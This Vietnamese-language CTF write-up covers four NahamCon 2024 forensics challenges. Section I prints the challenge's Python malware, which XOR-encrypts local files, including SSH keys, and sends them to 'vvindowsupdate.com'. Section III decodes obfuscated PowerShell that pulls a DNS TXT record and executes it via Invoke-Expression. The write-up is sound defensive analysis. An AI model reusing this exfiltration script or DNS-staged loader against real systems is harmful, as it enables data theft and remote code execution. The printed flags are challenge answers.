# NahamCon CTF 2024
### I. 1337 Malware.
- CHall này cho mình 1 file `.pcapng` , mình vào check thì chỉ thấy có TCP và HTTP protocol thui, sau khi follow thì mình thấy được cái code này.

```
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)

```
- Này là source của 1 con Malware , nó sẽ gửi các file trên máy đã được mã hóa.
- check thêm các stream khá thì mình có được data của các file đã bị mã hóa 
```
Sending: /home/davey/Documents/resources.zip
Sending: /home/davey/Documents/ecorp.png
Sending: /home/davey/Documents/Welcome Aboard.pdf
Sending: /home/davey/Documents/.ssh/id_rsa
Sending: /home/davey/Documents/.ssh/id_rsa.pub
```
- Tên file và data của file đó được hiển thị xen kẽ , muốn decrypt nó thì ta cần phải có key.
- Trước đó mình extract dữ liệu của các file bằng `Tshark` bởi vì lưu dữ liệu đó bằng wireshark sẽ bị sai.
- Để lấy được key ta cần xor cipher text với plain text , vấn đề là làm sao để có plain text thì việc này ta sẽ phải đoán, như trong source malware key có 32 byte ta buộc phải đoán rồi.
- Ta có 5 file đã bị mã hóa là `resource.zip` , `ecorp.png` , `Welcome_Aboard.pdf` ,`id_rsa` và `id_rsa.pub` , thì file `id_rsa` luôn luôn có phần dữ liệu đầu theo 1 format nhất định , ở trường hợp này nó được mở bằng SSH thế nên 32 byte đầu của nó là `-----BEGIN OPENSSH PRIVATE KEY-----`.
- Đây là code của mình:
```
import os
from random import randbytes
from pwn import xor
from binascii import unhexlify


str = "-----BEGIN OPENSSH PRIVATE KEY--"

def key_decrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(unhexlify(data.strip()), str.encode())
    return encrypted

def decrypt_file(filename,x):
    f = open(filename, 'rb')
    data = f.read().decode()
    f.close()
    encrypted = xor(bytes.fromhex(data), x)
    return encrypted

key = key_decrypt('id_rsa.bin')[0:32]

list_file= ["id_rsa.bin","resource.zip","ecorp.png","Welcome_Aboard.pdf"]


for i in list_file:
    with open(i,"rb") as file:
        data = file.read().decode()
    data = bytes.fromhex(data)
    p = decrypt_file(i,key)
    file_name = "dec_" + i
    try:
        with open(file_name,"w") as file:
            file.write(p.decode())  
    except:
        with open(file_name,"wb") as file:
            file.write(p)  
```
- Dữ liệu dã bị encrypt mình đã lưu vào cách file trong `list_file` mình chỉ cần đọc nó rồi xor với key là xong.
- Sau khi decrypt xong thì mình xem bên trong file zip nó có file `flag.txt` tuy nhiên nó cần password , nên mình check các file khác thì trong file pdf nó có đề cập tới password
![1717413878497](image/writeup/1717413878497.png)
![1717413897717](image/writeup/1717413897717.png)

*`FLAG: flag{c95c4ff18b0eb88123de779051a7a24f}`*
### II. Breath of the Wild
![1717414648613](image/writeup/1717414648613.png)
- CHall này cho mình 1 file `.vhdx` là  dạng ổ đĩa với pass là `videogames` nhập pass vào thì ta có rất nhiều ảnh.
- Đề bài yêu cầu là ta phải kiếm được nơi tải vè của tấm ảnh cũ nhất.
- Mình mở ổ đĩa lên bằng FTK cho dễ phân tich thì thấy bên trong mỗi file đều có tệp `Zone.Identifier` được đính kèm , Tệp đó cho ta biết đường link mà nó được tải về , Ta đã biết được địa chỉ rồi ta chỉ việc kiếm tấm ảnh cũ nhất thôi.
- Khi chek thì mấy thấy tấm ảnh số 46 này, Nó có độ phân giải khác biệt hoàn toàn so với các ảnh khác ( Đúng là tìm cái cũ nhất thật nhưng theo độ phân giải chứ ko phải thời gian :DD )
![1717414936682](image/writeup/1717414936682.png)
- trong tệp `Zone.Identifier` mình có được đường dẫn này.
```
https://www.gamewallpapers.com/wallpapers_slechte_compressie/01wallpapers/&#102;&%23108;&%2397;&%23103;&%23123;&%2356;&%2351;&%23102;&%2350;&%2398;&%2348;&%2397;&%2356;&%2399;&%23101;&%2351;&%2357;&%23102;&%2350;&%23101;&%2353;&%2398;&%2397;&%2349;&%23100;&%2354;&%2399;&%2355;&%2348;&%23101;&%2357;&%2355;&%23102;&%2350;&%2357;&%2349;&%23101;&%23125;

```
- Decode URL này ta được như sau:
```
https://www.gamewallpapers.com/wallpapers_slechte_compressie/01wallpapers/flag{83f2b0a8ce39f2e5ba1d6c70e97f291e}
```

*`FLAG: flag{83f2b0a8ce39f2e5ba1d6c70e97f291e}`*
### III. Logjam.
![1717429939243](image/writeup/1717429939243.png)
- Bài này cho ta folder chứa các file log event , bài này khá khó và cũng có nhiều cách giải.
- Khi strings file `Application.evtx` thì mình thấy 1 đoạn base64 rất dài , tuy nhiên cách xài strings này rất là hên xui , nên là mình sẽ chỉ cách khác khổ dâm hơn nhưng chắc chắn hơn.
![1717430132177](image/writeup/1717430132177.png)
- Ta sẽ sử dụng [tool này](https://github.com/williballenthin/python-evtx) ta xài `evtx_dump.py` để dump về file `Application.evtx` ta sẽ được 1 file text bên trong nó khá nhiều dữ liệu nhưng nếu để ý ta cũng sẽ thấy đoạn base cũng dài ko kém.
![1717430357027](image/writeup/1717430357027.png)
- nó cũng giống cái kia nhưng mà phải decode base64 2 lần, sau khi decode đoạn base ra thì ta được 1 script powershell sau:
```
$u7fInY =  [ChAr[]]")''nIOj-]2,11,3[eman.)'*Rdm*' elBAirav-TEg(( & |)93]rAhC[]gNIRTS[,)201]rAhC[+17]rAhC[+68]rAhC[((EcALper.)') (DnEOTdAEr.))iicsa::]gNIdoCNe.TxEt.mETSy'+'s[ , )'+')SsERpMocED::]eDOMNoISSerpMoC.NoIsSERpMOc.OI.metSYs'+'[ ,)'+'fGV=8w+2IX2i/'+'/Px+D1LdDdvgDHx0Da4rfSsissVDjqZXrXd'+'HwwgIMdd+b+'+'I2j3r4jNeKTYFX+H++mnP4L0u3sNsvJHmeAOLH88T030M0luhBzBIGCuwoZX7yZRbnbg7a174PITGc5Xlip/D/z6U5VZ7nO/APBWvIZYNhddwKDsG8A76A7fMef8'+'O6vMfncgC'+'i9gHHfQvjxq+y8Jibd+F+TdgqtK4HCOVjZg78/6RRhjg1A0YH4JIefd/ELkohlDo5GUdwKfiuZIDNFSfsr8Es9Z/T2gyyfY5K59mZ0WF/1ml58psO1MvbfWNxoNhpmDHyan05Am2y4XQm//iSEFVfHZE/Of8jPgvEPIfJ+ZwmLGNeVCUB3hMKc5n7cP713kzRx/a39WSVYB/eBqlcdk2QOQU30/PDdp9Yi3U3QRh8wg+eZu/T2XcjtA'+'3GZQ3AVQTpO6Zr2kvCRgKgVTrN7PANZe/RDBc+V8'+'EjJZgKCETT7pFpgWzmaCxrwq82DXSNNZ/FRZM'+'qDiCq2BulaQdboWAoa'+'H'+'n0EU9UD6QhrFOQRuu1yhr3lTRPcr5sjY428n3s/t5654O/iFOrvgegJUQFKfZ7RuYAQR1BPRah/TkpwdQwP7Z'+'D5HQ3rE'+'Gx'+'/KAZNGHAU9KCJBiglGYLkiq1xTF/iLXu0+kCybeHaht2u/syq0zKjeMn5vOIbvy+6mrt7/8qlTcm1'+'2CK1tomnNAb+cX6slpda2cm/tkFZfVajP/QGBalShL+o8ue/TBDiD9a+Nkx/V26O7cjU5Zx+9HW2'+'ie3y'+'FSiXK6C8TtKxk'+'T4E9fMU'+'KJgINRh32uWVr'+'JX'+'Lhyi2PAIkQJCiN1WUEqAFe/uljU8JPr4JbIqfDigSdZRClCUCfpHCrhUZY'+'4hy4ESnjVAtifBUTb/cgjdQmu/jWin+B2Wb54'+'PMHg8Oys'+'qv+'+'/Xbsn'+'67Hi5E3HcGbT78ftpLhAhuWQ7I0eCVg5pGNwVsJeiDejH/vXdKhUUdJcKbLa/Yx8mMFRqW5Wp1QhzszU2XlUqM7npZVGzssm55b4c2B5IB'+'QRZXnOiEzv/r5inQulI3WaFL0iX'+'Ij2JQ7cxOS1PXdLOEViOIqKYo93AXID8PQ+2PE4'+'s'+'9bpRVffGV (G'+'N'+'I'+'Rts46esa'+'BMOrF::]TrevNoC[]MAERTsYrOmeM.Oi'+'.meTsys[(mAErtseTALFed.nO'+'ISsErPmOc.oi.mETSy'+'s  tcEjBO-weN ( (REdAerMaeRtS.oi.meTsy'+'S  tcEjBO-weN ( nOIssERpXE-eKOVNi'("; [arRaY]::reverSe( (  VArIABle ('U7'+'fINY') -vA) );.( $VerbOSeprEfERencE.tOSTRing()[1,3]+'x'-JoiN'')( -JoIN(  VArIABle ('U7'+'fINY') -vA) )
```
- Ta sẽ thêm dòng `Write-Output $u7fInY` , lưu vào file `.ps1` và chạy file này , thì ta được dữ liệu như sau :
```
('iNVOKe-EXpREssIOn ( New-OBjEct  S'+'ysTem.io.StReaMreAdER( ( New-OBjEct  s'+'ySTEm.io.cOmPrEsSI'+'On.deFLATestrEAm([sysTem.'+'iO.MemOrYsTREAM][CoNverT]::FrOMB'+'ase64stR'+'I'+'N'+'G( VGffVRpb9'+'s'+'4EP2+QP8DIXA39oYKqIOiVEOLdXP1SOxc7QJ2jI'+'Xi0LFaW3IluQni5r/vzEiOnXZRQ'+'BI5B2c4b55msszGVZpn7MqUlX2UzszhQ1pW5WqRFMm8xY/aLbKcJdUUhKdXv/HjeDieJsVwNGp5gVCe0I7QWuhAhLptf87TbGcH3E5iH76'+'nsbX/'+'+vq'+'syO8gHMP'+'45bW2B+niWj/umQdjgc/bTUBfitAVjnSE4yh4'+'YZUhrCHpfCUClCRZdSgiDfqIbJ4rPJ8Ujlu/eFAqEUW1NiCJQkIAP2iyhL'+'XJ'+'rVWu23hRNIgJK'+'UMf9E4T'+'kxKtT8C6KXiSF'+'y3ei'+'2WH9+xZ5Ujc7O62V/xkN+a9DiDBT/eu8o+LhSlaBGQ/PjaVfZFkt/mc2adpls6Xc+bANnmot1KC2'+'1mcTlq8/7trm6+yvbIOv5nMejKz0qys/u2thaHebyCk+0uXLi/FTx1qikLYGlgiBJCK9UAHGNZAK/'+'xG'+'Er3QH5D'+'Z7PwQdwpkT/haRPB1RQAYuR7ZfKFQUJgegvrOFi/O4565t/s3n824Yjs5rcPRTl3rhy1uuRQOFrhQ6DU9UE0n'+'H'+'aoAWobdQaluB2qCiDq'+'MZRF/ZNNSXD28qwrxCamzWgpFp7TTECKgZJjE'+'8V+cBDR/eZNAP7NrTVgKgRCvk2rZ6OpTQVA3QZG3'+'AtjcX2T/uZe+gw8hRQ3U3iY9pdDP/03UQOQ2kdclqBe/BYVSW93a/xRzk317Pc7n5cKMh3BUCVeNGLmwZ+JfIPEvgPj8fO/EZHfVFESi//mQX4y2mA50nayHDmphNoxNWfbvM1Osp85lm1/FW0Zm95K5Yfyyg2T/Z9sE8rsfSFNDIZuifKwdUG5oDlhokLE/dfeIJ4HY0A1gjhRR6/87gZjVOCH4KtqgdT+F+dbiJ8y+qxjvQfHHg9i'+'CgcnfMv6O'+'8feMf7A67A8GsDKwddhNYZIvWBPA/On7ZV5U6z/D/pilX5cGTIP471a7gbnbRZy7XZowuCGIBzBhul0M030T88HLOAemHJvsNs3u0L4Pnm++H+XFYTKeNj4r3j2I'+'+b+ddMIgwwH'+'dXrXZqjDVssisSfr4aD0xHDgvdDdL1D+xP/'+'/i2XI2+w8=VGf'+'), ['+'sYStem.IO.cOMpRESsIoN.CoMpreSSIoNMODe]::DEcoMpREsS)'+') , [s'+'ySTEm.tExT.eNCodINg]::ascii)).rEAdTOEnD( )').repLAcE(([ChAr]86+[ChAr]71+[ChAr]102),[STRINg][ChAr]39)| & ((gET-variABle '*mdR*').name[3,11,2]-jOIn'')
```
- Nhìn và script thì ta thấy nó bị chèn ký tự `'+'` và các vị trí và cả `VGF` ở đầu và cuối đoạn base  xóa nó đi thì ta được code này.

```
iNVOKe-EXpREssIOn ( New-OBjEct  SysTem.io.StReaMreAdER( ( New-OBjEct  sySTEm.io.cOmPrEsSIOn.deFLATestrEAm([sysTem.iO.MemOrYsTREAM][CoNverT]::FrOMBase64stRING( 'fVRpb9s4EP2+QP8DIXA39oYKqIOiVEOLdXP1SOxc7QJ2jIXi0LFaW3IluQni5r/vzEiOnXZRQBI5B2c4b55msszGVZpn7MqUlX2UzszhQ1pW5WqRFMm8xY/aLbKcJdUUhKdXv/HjeDieJsVwNGp5gVCe0I7QWuhAhLptf87TbGcH3E5iH76nsbX/+vqsyO8gHMP45bW2B+niWj/umQdjgc/bTUBfitAVjnSE4yh4YZUhrCHpfCUClCRZdSgiDfqIbJ4rPJ8Ujlu/eFAqEUW1NiCJQkIAP2iyhLXJrVWu23hRNIgJKUMf9E4TkxKtT8C6KXiSFy3ei2WH9+xZ5Ujc7O62V/xkN+a9DiDBT/eu8o+LhSlaBGQ/PjaVfZFkt/mc2adpls6Xc+bANnmot1KC21mcTlq8/7trm6+yvbIOv5nMejKz0qys/u2thaHebyCk+0uXLi/FTx1qikLYGlgiBJCK9UAHGNZAK/xGEr3QH5DZ7PwQdwpkT/haRPB1RQAYuR7ZfKFQUJgegvrOFi/O4565t/s3n824Yjs5rcPRTl3rhy1uuRQOFrhQ6DU9UE0nHaoAWobdQaluB2qCiDqMZRF/ZNNSXD28qwrxCamzWgpFp7TTECKgZJjE8V+cBDR/eZNAP7NrTVgKgRCvk2rZ6OpTQVA3QZG3AtjcX2T/uZe+gw8hRQ3U3iY9pdDP/03UQOQ2kdclqBe/BYVSW93a/xRzk317Pc7n5cKMh3BUCVeNGLmwZ+JfIPEvgPj8fO/EZHfVFESi//mQX4y2mA50nayHDmphNoxNWfbvM1Osp85lm1/FW0Zm95K5Yfyyg2T/Z9sE8rsfSFNDIZuifKwdUG5oDlhokLE/dfeIJ4HY0A1gjhRR6/87gZjVOCH4KtqgdT+F+dbiJ8y+qxjvQfHHg9iCgcnfMv6O8feMf7A67A8GsDKwddhNYZIvWBPA/On7ZV5U6z/D/pilX5cGTIP471a7gbnbRZy7XZowuCGIBzBhul0M030T88HLOAemHJvsNs3u0L4Pnm++H+XFYTKeNj4r3j2I+b+ddMIgwwHdXrXZqjDVssisSfr4aD0xHDgvdDdL1D+xP//i2XI2+w8='), [sYStem.IO.cOMpRESsIoN.CoMpreSSIoNMODe]::DEcoMpREsS)) , [sySTEm.tExT.eNCodINg]::ascii)).rEAdTOEnD( )
```
- Khi giải mã ta sẽ được code này:
```

function Test-FileExists{param($F)(Test-Path$F)}
$G=[char[]](36,53,71,77,76,87)-join''
$L=4
$M="C:\Program Files\7-Zip\7z.exe"
$H=[char[]](40,82,101,115,111,108,118,101,45,68,110,115,78,97,109,101,32,34,97,112,112,108,105,99,97,116,105,111,110,46,101,118,116,120,46,122,105,112,34,32,45,84,121,112,101,32,116,120,116)-join''
for($N=0;$N-lt100;$N++){$L+=$N;$M=$M.ToUpper()}
$O=Get-Random -Minimum 1 -Maximum 100
$P=if($O%2-eq0){"Even"}else{"Odd"}
$J=[char[]](105,102,32,40,36,53,71,77,76,87,32,45,109,97,116,99,104,32,39,94,91,45,65,45,90,97,45,122,97,45,122,48,45,57,43,47,93,42,61,123,48,44,51,125,36,39,41)-join''
$Q=New-Object 'object[]'100
$K=[char[]](32,123,32,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,85,84,70,56,46,71,101,116,83,116,114,105,110,103,40,91,83,121,115,116,101,109,46,67,111,110,118,101,114,116,93,58,58,70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103,40,36,53,71,77,76,87,41,41,32,124,32,73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110,32,125)-join''
$CV=$env:comspec[4,15,25] -join ''
for($R=0;$R-lt$Q.Length;$R++){$Q[$R]=Get-Random}
function Get-ProcessOwner{param($S)$T=Get-Process -Name $S;}
$W=Get-Process
$I=[char[]](32,124,32,70,111,114,69,97,99,104,45,79,98,106,101,99,116,32,123,32,36,95,46,83,116,114,105,110,103,115,32,125,41,59)-join''
while($L -gt $N){$GZ="$G=$H $I $J $K"; & $CV $GZ; break}
$V=$V|Sort-Object -Unique
$Z=@()
for($AA=0;$AA-lt10;$AA++){$Z+=$AA}
$AB=$Z|Sort-Object -Descending
$AC=$AB|ForEach-Object{$AD=$_;if ($AD -gt 5) {return"fizz"} else {return"fizzbuzz"}} *>$null
```
- Có những biến có đoạn dec trong đó nên mình sẽ gộp nó lại và in nó ra bằng cách thêm code sauu:
```
$GZ="$G=$H $I $J $K";
Write-Output $GZ
```
- Ta sẽ được dòng này.
```
$5GMLW=(Resolve-DnsName "application.evtx.zip" -Type txt  | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-za-z0-9+/]*={0,3}$')  { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression }
```
- Ta chỉ cần chạy code này thì ta sẽ được đoạn base nữa decode ra là có flag
```
Resolve-DnsName 'application.evtx.zip' -Type txt

Name                                     Type   TTL   Section    Strings
----                                     ----   ---   -------    -------
application.evtx.zip                     TXT    300   Answer     {Y2FsYy5leGUKI1pteGhaM3RqWVRoak1qZzRaREV6
                                                                 T1RVMk9EazFOemN5T0RkaVlUTmlaakkyTkRsaFpIM
                                                                 D0K}
```
```
echo "Y2FsYy5leGUKI1pteGhaM3RqWVRoak1qZzRaREV6T1RVMk9EazFOemN5T0RkaVlUTmlaakkyTkRsaFpIMD0K" | base64 -d 
calc.exe
#ZmxhZ3tjYThjMjg4ZDEzOTU2ODk1NzcyODdiYTNiZjI2NDlhZH0=
```

```
echo "ZmxhZ3tjYThjMjg4ZDEzOTU2ODk1NzcyODdiYTNiZjI2NDlhZH0=" | base64 -d 
flag{ca8c288d1395689577287ba3bf2649ad}
```
- Tuy nhiên :))) , ta chỉ cần xài [tool này](https://github.com/Malandrone/PowerDecode) , chạy 1 phát ra thẳng flag lun ko cần phải dài dòng :DĐ.
- Chỉ cần lưu cái powershell code đầu tiên mà ta decode ra được vào  file sau đó xài tool này ở `Layer `6` là ta thấy flag lun r
![1717431828507](image/writeup/1717431828507.png)
![1717431863431](image/writeup/1717431863431.png)

*`FLAG: flag{ca8c288d1395689577287ba3bf2649ad}`*
### IV. Taking Up Residence
![1717752815161](image/writeup/1717752815161.png)
```
Question: A resident file is a file that is the primary copy of a file and is stored on a disk, whether or not the disk is online. In computer forensics, a resident file can also be a file that only exists within the Master File Table (MFT) if the file is small.
```
- Mình mở nó bằng `notepad` và `HxD` để xem cho tiện và filter nó bằng `flag.txt` nhằm kiếm flag xem có file nào như thế không vi nó vốn là 1 ổ đĩa được dump bởi MFT.
![1717753780289](image/writeup/1717753780289.png)
- Thì mình thấy  file python nó mã hóa file `flag.txt` bằng thuật toán `fernet` ở ngay bên dưới code đó cũng cho ta luôn key.
![1717753916773](image/writeup/1717753916773.png)
- Giở ta chỉ cần kiếm nội dung bên trong của file flag.txt được mã hóa là được.
![1717754085917](image/writeup/1717754085917.png)
- Khi mà mình filter bằng `flag.txt` thì có thấy đoạn base này nhìn nó rất giống là 1 file nào đó đã bị mã hóa , nên là mình có thử filter bằng `gAAAAA` thì mình kiếm được cái này.
![1717754398919](image/writeup/1717754398919.png)
- Mình decode nó bằng `fernet` là ra flag.
![1717754424420](image/writeup/1717754424420.png)

*`FLAG: flag{a4096cd70d8859d38cf8e7487b4cd0fa}`*
